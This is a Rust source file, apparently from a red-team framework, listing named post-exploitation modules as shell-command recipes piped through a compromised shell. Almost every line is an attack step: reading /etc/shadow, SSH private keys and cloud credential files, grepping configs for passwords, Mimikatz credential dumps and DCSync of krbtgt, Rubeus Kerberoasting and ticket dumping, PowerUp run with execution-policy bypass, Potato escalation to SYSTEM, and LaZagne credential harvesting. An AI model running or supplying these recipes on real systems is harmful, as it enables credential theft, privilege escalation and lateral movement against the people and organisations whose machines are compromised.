//! Named session post-modules (research/FRAMEWORK.md §4): ordered shell-command
//! recipes piped through a caught raw shell, MSF-post-module style but tool-free.

use super::postex::Os;

pub struct Module {
    pub name: &'static str,
    pub os: Option<Os>, // None = any
    pub desc: &'static str,
    pub mitre: &'static [&'static str],
    /// (label, command) pairs, run in order.
    pub steps: &'static [(&'static str, &'static str)],
}

pub static MODULES: &[Module] = &[
    Module {
        name: "linux-quick-recon",
        os: Some(Os::Linux),
        desc: "Who/where am I: user, host, network, sudo.",
        mitre: &["T1082", "T1033", "T1016"],
        steps: &[
            ("whoami", "id; hostname; who"),
            ("os", "uname -a; cat /etc/os-release 2>/dev/null"),
            ("net", "ip -o addr 2>/dev/null || ifconfig -a 2>/dev/null; ip route 2>/dev/null"),
            ("sudo", "sudo -n -l 2>/dev/null"),
        ],
    },
    Module {
        name: "linux-priv-check",
        os: Some(Os::Linux),
        desc: "Local privesc surface: sudo, SUID, caps, cron, writable paths.",
        mitre: &["T1548", "T1069"],
        steps: &[
            ("sudo", "sudo -n -l 2>/dev/null; cat /etc/sudoers 2>/dev/null"),
            ("suid", "find / -perm -4000 -type f 2>/dev/null"),
            ("caps", "getcap -r / 2>/dev/null"),
            ("cron", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null; crontab -l 2>/dev/null"),
            ("writable", "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys' | head -40"),
            ("kernel", "uname -r; cat /proc/version"),
        ],
    },
    Module {
        name: "harvest-ssh-keys",
        os: Some(Os::Linux),
        desc: "Pull SSH private keys, authorized_keys and known_hosts for lateral movement.",
        mitre: &["T1552.004"],
        steps: &[
            ("private", "for d in /home/* /root; do echo \"== $d ==\"; cat $d/.ssh/id_* 2>/dev/null; done"),
            ("authorized", "for d in /home/* /root; do cat $d/.ssh/authorized_keys 2>/dev/null; done"),
            ("known", "for d in /home/* /root; do cat $d/.ssh/known_hosts 2>/dev/null; done"),
        ],
    },
    Module {
        name: "linux-cred-hunt",
        os: Some(Os::Linux),
        desc: "Hunt credentials in files, history, env and cloud config.",
        mitre: &["T1552.001", "T1552.002"],
        steps: &[
            ("shadow", "cat /etc/shadow 2>/dev/null"),
            ("history", "cat ~/.bash_history /home/*/.bash_history 2>/dev/null | tail -80"),
            ("configs", "grep -rEi 'password|passwd|secret|api[_-]?key' /var/www /etc /opt 2>/dev/null | head -40"),
            ("cloud", "cat ~/.aws/credentials ~/.config/gcloud/*.json /root/.aws/credentials 2>/dev/null"),
        ],
    },
    Module {
        name: "windows-priv-check",
        os: Some(Os::Windows),
        desc: "Windows privesc surface: privileges, groups, patches, services.",
        mitre: &["T1082", "T1069", "T1518"],
        steps: &[
            ("whoami", "whoami /all"),
            ("patches", "wmic qfe get HotFixID,InstalledOn 2>nul"),
            ("services", "wmic service get name,pathname,startmode 2>nul | findstr /i /v \"C:\\Windows\""),
            ("tasks", "schtasks /query /fo LIST /v 2>nul | findstr /i \"taskname task to run\""),
        ],
    },
    Module {
        name: "windows-cred-hunt",
        os: Some(Os::Windows),
        desc: "Windows credential hunt: cmdkey, saved creds, unattend, registry.",
        mitre: &["T1552.001", "T1555"],
        steps: &[
            ("cmdkey", "cmdkey /list"),
            ("unattend", "type C:\\Windows\\Panther\\Unattend.xml 2>nul & type C:\\Windows\\Panther\\Unattended.xml 2>nul"),
            ("autologon", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul"),
            ("files", "findstr /si password *.txt *.ini *.config *.xml 2>nul"),
        ],
    },
    Module {
        name: "windows-domain-recon",
        os: Some(Os::Windows),
        desc: "Domain situational awareness from a Windows shell.",
        mitre: &["T1087.002", "T1482", "T1018"],
        steps: &[
            ("domain", "echo %USERDOMAIN% %LOGONSERVER%; nltest /dclist: 2>nul"),
            ("users", "net user /domain 2>nul"),
            ("admins", "net group \"Domain Admins\" /domain 2>nul"),
            ("computers", "net group \"Domain Computers\" /domain 2>nul | more"),
        ],
    },
    // ─── Windows target-tool modules (upload the binary through the session first) ───
    Module {
        name: "mimikatz-creds",
        os: Some(Os::Windows),
        desc: "Mimikatz: dump logon passwords, SAM and LSA secrets (upload mimikatz.exe first).",
        mitre: &["T1003.001", "T1003.002", "T1003.004"],
        steps: &[
            ("logonpasswords", ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""),
            ("sam", ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\""),
            ("secrets", ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" \"exit\""),
        ],
    },
    Module {
        name: "mimikatz-dcsync",
        os: Some(Os::Windows),
        desc: "Mimikatz DCSync: pull an account's hash from a DC (needs replication rights).",
        mitre: &["T1003.006"],
        steps: &[
            ("krbtgt", ".\\mimikatz.exe \"lsadump::dcsync /domain:DOMAIN /user:krbtgt\" \"exit\""),
            ("admin", ".\\mimikatz.exe \"lsadump::dcsync /domain:DOMAIN /user:Administrator\" \"exit\""),
        ],
    },
    Module {
        name: "rubeus-roast",
        os: Some(Os::Windows),
        desc: "Rubeus: Kerberoast and AS-REP roast from a domain context (upload Rubeus.exe first).",
        mitre: &["T1558.003", "T1558.004"],
        steps: &[
            ("kerberoast", ".\\Rubeus.exe kerberoast /format:hashcat /nowrap"),
            ("asreproast", ".\\Rubeus.exe asreproast /format:hashcat /nowrap"),
        ],
    },
    Module {
        name: "rubeus-triage",
        os: Some(Os::Windows),
        desc: "Rubeus: list/triage Kerberos tickets and dump TGTs in memory.",
        mitre: &["T1558", "T1550.003"],
        steps: &[("triage", ".\\Rubeus.exe triage"), ("dump", ".\\Rubeus.exe dump /nowrap")],
    },
    Module {
        name: "seatbelt-recon",
        os: Some(Os::Windows),
        desc: "Seatbelt: host + user situational awareness (upload Seatbelt.exe first).",
        mitre: &["T1082", "T1518", "T1552"],
        steps: &[("all", ".\\Seatbelt.exe -group=all -full")],
    },
    Module {
        name: "sharphound-collect",
        os: Some(Os::Windows),
        desc: "SharpHound: collect the BloodHound graph from a domain-joined host.",
        mitre: &["T1087.002", "T1069.002", "T1482"],
        steps: &[("collect", ".\\SharpHound.exe -c All --zipfilename loot")],
    },
    Module {
        name: "powerup-checks",
        os: Some(Os::Windows),
        desc: "PowerUp: enumerate common Windows privilege-escalation vectors (PowerShell).",
        mitre: &["T1078", "T1574"],
        steps: &[(
            "allchecks",
            "powershell -ep bypass -c \"IEX(Get-Content .\\PowerUp.ps1 -Raw); Invoke-AllChecks\"",
        )],
    },
    Module {
        name: "potato-system",
        os: Some(Os::Windows),
        desc: "SeImpersonate -> SYSTEM via a Potato (PrintSpoofer/GodPotato). Upload the exe first.",
        mitre: &["T1134.001", "T1068"],
        steps: &[
            ("whoami-priv", "whoami /priv"),
            ("printspoofer", ".\\PrintSpoofer.exe -i -c \"cmd /c whoami\""),
            ("godpotato", ".\\GodPotato.exe -cmd \"cmd /c whoami\""),
        ],
    },
    Module {
        name: "winpeas-run",
        os: Some(Os::Windows),
        desc: "WinPEAS: full Windows privesc enumeration (upload winPEASx64.exe first).",
        mitre: &["T1082", "T1552"],
        steps: &[("run", ".\\winPEASx64.exe")],
    },
    Module {
        name: "lazagne-creds",
        os: Some(Os::Windows),
        desc: "LaZagne: harvest stored credentials from browsers, mail, wifi, etc.",
        mitre: &["T1555", "T1552.001"],
        steps: &[("all", ".\\lazagne.exe all")],
    },
];

pub fn by_name(name: &str) -> Option<&'static Module> {
    MODULES.iter().find(|m| m.name.eq_ignore_ascii_case(name))
}
